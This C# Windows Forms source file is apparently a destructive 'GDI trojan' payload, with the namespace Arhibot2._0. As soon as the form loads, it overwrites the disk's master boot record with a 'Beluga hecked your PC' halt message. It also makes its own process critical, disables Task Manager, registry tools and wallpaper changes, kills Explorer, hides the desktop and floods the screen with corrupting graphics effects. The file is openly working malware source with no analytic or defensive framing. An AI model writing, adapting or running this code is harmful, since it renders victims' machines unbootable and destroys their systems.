﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Media;
using System.IO;
namespace Arhibot2._0
{
    public partial class Form2 : Form
    {
        public static string getwarnmsg()
        {

            var sb = new StringBuilder();

            if (Program.lang == "en")
            {
                sb.Append("g3t ready...");
            }
            else
            {
                sb.Append("будь г0т0в....");
            }
            return sb.ToString();
        }
        public static string getwarnmsg2()
        {

            var sb = new StringBuilder();

            if (Program.lang == "en")
            {
                sb.Append("what the hell?");
            }
            else
            {
                sb.Append("что за чертовщина?");
            }
            return sb.ToString();
        }

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);
        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int crColor);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);
        enum TernaryRasterOperations : uint
        {
            /// <summary>dest = source</summary>
            SRCCOPY = 0x00CC0020,
            /// <summary>dest = source OR dest</summary>
            SRCPAINT = 0x00EE0086,
            /// <summary>dest = source AND dest</summary>
            SRCAND = 0x008800C6,
            /// <summary>dest = source XOR dest</summary>
            SRCINVERT = 0x00660046,
            /// <summary>dest = source AND (NOT dest)</summary>
            SRCERASE = 0x00440328,
            /// <summary>dest = (NOT source)</summary>
            NOTSRCCOPY = 0x00330008,
            /// <summary>dest = (NOT src) AND (NOT dest)</summary>
            NOTSRCERASE = 0x001100A6,
            /// <summary>dest = (source AND pattern)</summary>
            MERGECOPY = 0x00C000CA,
            /// <summary>dest = (NOT source) OR dest</summary>
            MERGEPAINT = 0x00BB0226,
            /// <summary>dest = pattern</summary>
            PATCOPY = 0x00F00021,
            /// <summary>dest = DPSnoo</summary>
            PATPAINT = 0x00FB0A09,
            /// <summary>dest = pattern XOR dest</summary>
            PATINVERT = 0x005A0049,
            /// <summary>dest = (NOT dest)</summary>
            DSTINVERT = 0x00550009,
            /// <summary>dest = BLACK</summary>
            BLACKNESS = 0x00000042,
            /// <summary>dest = WHITE</summary>
            WHITENESS = 0x00FF0062,
            /// <summary>
            /// Capture window as seen on screen.  This includes layered windows
            /// such as WPF windows with AllowsTransparency="true"
            /// </summary>
            CAPTUREBLT = 0x40000000
        }
        public class Native
        {
            public delegate bool EnumThreadProc(IntPtr hwnd, IntPtr lParam);
            public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);


            [DllImport("user32.dll")]
            public static extern IntPtr FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            public static extern IntPtr FindWindowEx(IntPtr parentHwnd, IntPtr childAfterHwnd, IntPtr className,
                string windowText);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool ShowWindow(IntPtr hWnd, ShowWindowCommands nCmdShow);

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            public static extern bool EnumThreadWindows(int threadId, EnumThreadProc pfnEnum, IntPtr lParam);

            [DllImport("user32.dll")]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

            [DllImport("user32.dll")]
            public static extern IntPtr GetDlgItem(IntPtr hDlg, int nIDDlgItem);

            [DllImport("user32.dll")]
            public static extern IntPtr GetShellWindow();

            [DllImport("user32.dll", SetLastError = true)]
            public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className,
                string windowTitle);

            [DllImport("user32.dll")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

            [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);


            [DllImport("user32.dll", EntryPoint = "BlockInput")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

            [DllImport("user32.dll")]
            public static extern int SwapMouseButton(int bSwap);

            [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
            public static extern int mciSendString(string lpstrCommand,
                                                      StringBuilder lpstrReturnString,
                                                      int uReturnLength,
                                                      IntPtr hwndCallback);
        }
        public enum ShowWindowCommands
        {
            Hide = 0,

            Normal = 1,

            ShowMinimized = 2,

            Maximize = 3,

            ShowMaximized = 3,

            ShowNoActivate = 4,

            Show = 5,

            Minimize = 6,

            ShowMinNoActive = 7,

            ShowNA = 8,

            Restore = 9,

            ShowDefault = 10,

            ForceMinimize = 11
        }
        public static void SetDesktopVisibility(bool visible)
        {
            var hWnd = GetDesktopWindow(DesktopWindow.ProgMan);
            Native.ShowWindow(hWnd, visible ? ShowWindowCommands.Show : ShowWindowCommands.Hide);
        }
        public enum DesktopWindow
        {
            ProgMan,
            SHELLDLL_DefViewParent,
            SHELLDLL_DefView,
            SysListView32
        }
        public static IntPtr GetDesktopWindow(DesktopWindow desktopWindow)
        {
            IntPtr progMan = Native.GetShellWindow();
            IntPtr shelldllDefViewParent = progMan;
            IntPtr shelldllDefView = Native.FindWindowEx(progMan, IntPtr.Zero, "SHELLDLL_DefView", null);
            IntPtr sysListView32 = Native.FindWindowEx(shelldllDefView, IntPtr.Zero, "SysListView32",
                "FolderView");

            if (shelldllDefView == IntPtr.Zero)
            {
                Native.EnumWindows((hwnd, lParam) =>
                {
                    const int maxChars = 256;
                    StringBuilder className = new StringBuilder(maxChars);

                    if (Native.GetClassName(hwnd, className, maxChars) > 0 && className.ToString() == "WorkerW")
                    {
                        IntPtr child = Native.FindWindowEx(hwnd, IntPtr.Zero, "SHELLDLL_DefView", null);
                        if (child != IntPtr.Zero)
                        {
                            shelldllDefViewParent = hwnd;
                            shelldllDefView = child;
                            sysListView32 = Native.FindWindowEx(child, IntPtr.Zero, "SysListView32", "FolderView");
                            return false;
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }

            switch (desktopWindow)
            {
                case DesktopWindow.ProgMan:
                    return progMan;
                case DesktopWindow.SHELLDLL_DefViewParent:
                    return shelldllDefViewParent;
                case DesktopWindow.SHELLDLL_DefView:
                    return shelldllDefView;
                case DesktopWindow.SysListView32:
                    return sysListView32;
                default:
                    return IntPtr.Zero;
            }
        }
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 WinIni);
        public void MBR()
        {
            var mbrData = new byte[] {0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
    0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
    0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x05, 0xB0, 0x00, 0xB7, 0x09, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
    0xCD, 0x10, 0xC3, 0x46, 0x41, 0x54, 0x41, 0x4C, 0x3A, 0x20, 0x42, 0x65, 0x6C, 0x75, 0x67, 0x61,
    0x20, 0x68, 0x65, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x50, 0x43, 0x2E,
    0x20, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x69, 0x73, 0x20, 0x68, 0x61, 0x6C, 0x74, 0x65,
    0x64, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA};
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            try
            {
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                CloseHandle(mbr);
            }
            catch { }
        }
        

        public Form2()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            MBR();
            int processInformation = 1;
            int processInformationClass = 29;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            RegistryKey noremovewall = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
            noremovewall.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            msgbox.Start();
            timer2.Start();
        }

        private void msgbox_Tick(object sender, EventArgs e)
        {
            msgbox.Stop();
            string text = getwarnmsg();
            MessageBox.Show(text, "", MessageBoxButtons.RetryCancel, MessageBoxIcon.Stop);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            Process process = Process.GetProcessesByName("explorer")[0];
            process.Kill();
            Process.Start(process.MainModule.FileName);
            Wallpaper.ChangeWallpaper();
            timer3.Start();
        }
        public class Wallpaper
        {
            public static void ChangeWallpaper()
            {
                SystemParametersInfo(0x14, 0, @"C:/Program Files/Custom.jpg", 0x01 | 0x02);
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            SetDesktopVisibility(false);
            timer4.Start();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            gdi1.Start();
            timer5.Start();
        }
        Random r;
        private void gdi1_Tick(object sender, EventArgs e)
        {
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
           
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(-10, 10), r.Next(-10, 10), x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, r.Next(-10, 10), r.Next(-10, 10), x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            timer5.Stop();
            gdi1.Stop();
            clear_screen();
            gdi2.Start();
            timer6.Start();
        }

        private void gdi2_Tick(object sender, EventArgs e)
        {
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            BitBlt(hdc, r.Next(20), r.Next(20), x, y, hdc, r.Next(20), r.Next(20), TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, r.Next(-10, 10), r.Next(-10, 10), x, y, hdc, 0, 0, x, y, TernaryRasterOperations.MERGECOPY);
        }
        private static void clear_screen()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            timer6.Stop();
            gdi2.Stop();
            clear_screen();
            spam.Start();
            gdi3.Start();
            timer7.Start();
        }

        private void gdi3_Tick(object sender, EventArgs e)
        {
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            IntPtr green = CreateSolidBrush(r.Next(1000000000));
            SelectObject(hdc, green);
            PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
            StretchBlt(hdc, r.Next(x) - 1000, r.Next(y) - 1000, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);

        }

        private void spam_Tick(object sender, EventArgs e)
        {
            spam.Start();
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            timer7.Stop();
            gdi3.Stop();
            spam.Stop();
            gdi4.Start();
            timer8.Start();
        }

        private void gdi4_Tick(object sender, EventArgs e)
        {
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            IntPtr green = CreateSolidBrush(r.Next(1000000000));
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawLine(Pens.Red, new Point(r.Next(1, 900), r.Next(1, 900)), new Point(130, 360));
            }
        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            timer8.Stop();
            gdi4.Stop();
            gdi5.Start();
            timer9.Start();
        }

        private void gdi5_Tick(object sender, EventArgs e)
        {
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x1 = r.Next(1280);
            int y2 = r.Next(800);
            BitBlt(hdc, x - x1, y - y2, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
            Cursor.Position = new Point(x1, y2);

        }

        private void timer9_Tick(object sender, EventArgs e)
        {
            timer9.Stop();
            gdi5.Stop();
            clear_screen();
            gdi6.Start();
            timer10.Start();
            msgbox2.Start();
        }

        private void gdi6_Tick(object sender, EventArgs e)
        {
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, 25, 25, x - 40, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, r.Next(5), r.Next(5), x - r.Next(10), y - r.Next(10), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY); // Этот код из моего туториала
        }

        private void timer10_Tick(object sender, EventArgs e)
        {
            timer10.Stop();
            last_msg.Stop();
            gdi6.Stop();
            clear_screen();
            Environment.Exit(-1);
        }

        private void msgbox2_Tick(object sender, EventArgs e)
        {
            msgbox2.Stop();
            string name = Environment.MachineName;
            string text = getwarnmsg2();
            MessageBox.Show(text, name, MessageBoxButtons.OKCancel, MessageBoxIcon.Warning);
        }

        private void black_screen_Tick(object sender, EventArgs e)
        {
            // пусто.
        }

        private void last_msg_Tick(object sender, EventArgs e)
        {
            last_msg.Stop();
            MessageBox.Show("???", "???", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
        }
    }
}
